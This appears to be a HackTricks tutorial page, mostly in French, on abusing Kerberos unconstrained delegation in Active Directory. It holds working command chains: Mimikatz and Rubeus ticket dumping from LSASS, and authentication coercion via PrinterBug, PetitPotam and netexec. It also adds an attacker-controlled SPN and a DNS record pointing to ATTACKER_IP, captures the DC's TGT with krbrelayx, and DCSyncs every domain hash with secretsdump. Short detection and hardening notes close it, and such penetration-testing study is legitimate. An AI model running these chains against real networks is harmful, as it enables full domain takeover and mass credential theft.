# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

C’est une fonctionnalité qu’un Domain Administrator peut définir sur n’importe quel **Computer** au sein du domain. Ensuite, à chaque fois qu’un **user logins** sur le Computer, une **copie du TGT** de cet user va être **envoyée dans le TGS** fourni par le DC **et sauvegardée en mémoire dans LSASS**. Donc, si vous avez des privilèges Administrator sur la machine, vous pourrez **dump les tickets et impersonate les users** sur n’importe quelle machine.

Donc si un domain admin se connecte à un Computer avec la fonctionnalité "Unconstrained Delegation" activée, et que vous avez des privilèges local admin sur cette machine, vous pourrez dump le ticket et impersonate le Domain Admin partout (domain privesc).

Vous pouvez **find Computer objects with this attribute** en vérifiant si l’attribut [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) contient [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). Vous pouvez faire cela avec un filtre LDAP de ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, ce que fait powerview :
```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```
Chargez le ticket de Administrator (ou de l'utilisateur victime) en mémoire avec **Mimikatz** ou **Rubeus for a** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Plus d'informations : [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Plus d'informations sur Unconstrained delegation dans ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Force Authentication**

Si un attaquant est capable de **compromettre un ordinateur autorisé pour "Unconstrained Delegation"**, il pourrait **tromper** un **Print server** pour **se connecter automatiquement** à celui-ci **en enregistrant un TGT** dans la mémoire du serveur.\
Ensuite, l'attaquant pourrait effectuer une attaque **Pass the Ticket pour usurper l'identité** de l'utilisateur compte machine du Print server.

Pour faire en sorte qu'un print server se connecte à n'importe quelle machine, vous pouvez utiliser [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Si le TGT provient d’un domain controller, vous pourriez effectuer une [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) et obtenir tous les hashes du DC.\
[**Plus d’informations sur cette attack sur ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

Trouvez ici d’autres moyens de **forcer une authentication :**


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

Toute autre primitive de coercition qui amène la victime à s’authentifier avec **Kerberos** vers votre hôte en unconstrained-delegation fonctionne aussi. Dans les environnements modernes, cela signifie souvent remplacer le flux classique PrinterBug par **PetitPotam**, **DFSCoerce**, **ShadowCoerce**, **MS-EVEN** ou une coercition basée sur **WebClient/WebDAV**, selon la surface RPC accessible.

### Abusing a user/service account with unconstrained delegation

L’unconstrained delegation ne se limite pas aux objets computer. Un **user/service account** peut aussi être configuré comme `TRUSTED_FOR_DELEGATION`. Dans ce scénario, l’exigence pratique est que le compte doive recevoir des Kerberos service tickets pour un **SPN qu’il possède**.

Cela conduit à 2 chemins offensifs très courants :

1. Vous compromettez le password/hash du **user account** en unconstrained-delegation, puis vous **ajoutez un SPN** à ce même compte.
2. Le compte possède déjà un ou plusieurs SPNs, mais l’un d’eux pointe vers un **hostname obsolète/désaffecté** ; recréer l’enregistrement **DNS A** manquant suffit à détourner le flux d’authentication sans modifier l’ensemble des SPNs.

Flux Linux minimal :
```bash
# 1) Find unconstrained-delegation users and their SPNs
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}
findDelegation.py -target-domain <DOMAIN_FQDN> <DOMAIN>/<USER>:'<PASS>'

# 2) If needed, add a listener SPN to the compromised unconstrained user
python3 addspn.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-s 'HOST/kud-listener.<DOMAIN_FQDN>' --target-type samname <DC_IP>

# 3) Make the hostname resolve to your attacker box
python3 dnstool.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-r 'kud-listener.<DOMAIN_FQDN>' -a add -t A -d <ATTACKER_IP> <DC_IP>

# 4) Start krbrelayx with the unconstrained user's Kerberos material
#    For user accounts, the salt is usually UPPERCASE_REALM + samAccountName
python3 krbrelayx.py --krbsalt '<DOMAIN_FQDN_UPPERCASE>svc_kud' --krbpass '<PASS>' -dc-ip <DC_IP>

# 5) Coerce the DC/target server to authenticate to the SPN you own
python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_FQDN>
# Or swap the coercion primitive for PetitPotam / DFSCoerce / Coercer if needed

# 6) Reuse the captured ccache for DCSync or lateral movement
KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
```
Notes :

- Cela est particulièrement utile lorsque le principal unconstrained est un **service account** et que vous n’avez que ses identifiants, pas d’exécution de code sur un hôte joint.
- Si l’utilisateur cible a déjà un **stale SPN**, recréer l’enregistrement **DNS** correspondant peut être moins bruyant que d’écrire un nouveau SPN dans AD.
- Les techniques récentes centrées sur Linux utilisent `addspn.py`, `dnstool.py`, `krbrelayx.py`, et un primitive de coercion ; vous n’avez pas besoin de toucher un hôte Windows pour terminer la chaîne.

### Abusing Unconstrained Delegation with an attacker-created computer

Les domaines modernes ont souvent `MachineAccountQuota > 0` (par défaut 10), ce qui permet à tout principal authentifié de créer jusqu’à N objets computer. Si vous détenez aussi le privilège de token `SeEnableDelegationPrivilege` (ou des droits équivalents), vous pouvez configurer le computer nouvellement créé pour être trusted for unconstrained delegation et récupérer les TGT entrants provenant de systèmes privilégiés.

Flux de haut niveau :

1) Create a computer you control
```bash
# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```
2) Rendre le faux hostname résolvable au sein du domaine
```bash
# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
--action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
-dns-ip <DC_IP> <DC_FQDN>
```
3) Activer l’Unconstrained Delegation sur l’ordinateur contrôlé par l’attaquant
```bash
# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
# BloodyAD example
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```
Pourquoi cela fonctionne : avec la unconstrained delegation, l'LSA sur un ordinateur avec delegation activée met en cache les TGT entrants. Si vous trompez un DC ou un serveur privilégié pour qu'il s'authentifie auprès de votre faux hôte, son machine TGT sera stocké et pourra être exporté.

4) Démarrez krbrelayx en mode export et préparez le matériel Kerberos
```bash
# Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
# Prefer supplying the AES key directly, or derive it from the known password+salt if needed.
python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>

# Alternative if you know the password and correct Kerberos salt:
python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
```
5) Contraindre l’authentification depuis le DC/les serveurs vers votre faux hôte
```bash
# netexec (CME fork) coerce_plus module supports multiple coercion vectors
# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
```
krbrelayx enregistrera les fichiers ccache lorsqu'une machine s'authentifie, par exemple :
```
Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
```
6) Utiliser le TGT de la machine DC capturé pour effectuer DCSync
```bash
# Create a krb5.conf for the realm (netexec helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use the saved ccache to DCSync (netexec helper)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Alternatively with Impacket (Kerberos from ccache)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Notes et exigences :

- `MachineAccountQuota > 0` permet la création non privilégiée de computer ; sinon, tu as besoin de droits explicites.
- Définir `TRUSTED_FOR_DELEGATION` sur un computer nécessite `SeEnableDelegationPrivilege` (ou domain admin).
- Assure-toi que la résolution de nom vers ton faux hôte fonctionne (DNS A record) afin que le DC puisse l’atteindre via son FQDN.
- La coercion requiert un vecteur viable (PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN, etc.). Désactive-les sur les DCs si possible.
- Si le compte victime est marqué **"Account is sensitive and cannot be delegated"** ou fait partie de **Protected Users**, le TGT transféré ne sera pas inclus dans le service ticket, donc cette chaîne ne donnera pas de TGT réutilisable.
- Si **Credential Guard** est activé sur le client/serveur qui s’authentifie, Windows bloque **Kerberos unconstrained delegation**, ce qui peut faire échouer des chemins de coercion autrement valides du point de vue de l’opérateur.

Idées de détection et de durcissement :

- Alerter sur l’Event ID 4741 (computer account créé) et 4742/4738 (computer/user account modifié) lorsque UAC `TRUSTED_FOR_DELEGATION` est défini.
- Surveiller les ajouts inhabituels de DNS A-record dans la zone du domaine.
- Surveiller les pics de 4768/4769 provenant d’hôtes inattendus et les authentifications du DC vers des hôtes non-DC.
- Restreindre `SeEnableDelegationPrivilege` à un ensemble minimal, définir `MachineAccountQuota=0` quand c’est possible, et désactiver Print Spooler sur les DCs. Imposer LDAP signing et channel binding.

### Mitigation

- Limiter les connexions DA/Admin à des services spécifiques
- Définir "Account is sensitive and cannot be delegated" pour les comptes privilégiés.

## References

- HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA: https://0xdf.gitlab.io/2025/09/12/htb-delegate.html
- harmj0y – S4U2Pwnage: https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/
- ired.team – Domain compromise via unrestricted delegation: https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation
- krbrelayx: https://github.com/dirkjanm/krbrelayx
- Impacket addcomputer.py: https://github.com/fortra/impacket
- BloodyAD: https://github.com/CravateRouge/bloodyAD
- netexec (CME fork): https://github.com/Pennyw0rth/NetExec
- Praetorian – Unconstrained Delegation in Active Directory: https://www.praetorian.com/blog/unconstrained-delegation-active-directory/
- Microsoft Learn – Protected Users Security Group: https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group

{{#include ../../banners/hacktricks-training.md}}
